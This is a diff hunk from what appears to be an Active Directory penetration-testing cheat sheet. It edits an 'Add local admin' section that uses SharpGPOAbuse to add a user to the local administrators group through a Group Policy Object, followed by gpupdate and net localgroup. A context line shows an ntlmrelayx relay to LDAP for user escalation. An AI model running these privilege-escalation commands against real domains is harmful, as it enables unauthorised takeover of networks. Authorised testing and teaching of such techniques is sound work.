@@ -311,8 +311,8 @@ ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
 
 #### Add local admin
 ```
-./ShapGPOAbuse.exe --AddLocalAdmin --GPOName test --UserAccount Analyst1"
-gpupdate /force
+./ShapGPOAbuse.exe --AddLocalAdmin --GPOName <GPONAME> --UserAccount <USERNAME>
+gpupdate /force #On the target machine if you got normal access already
 net localgroup administrators
 ```
 
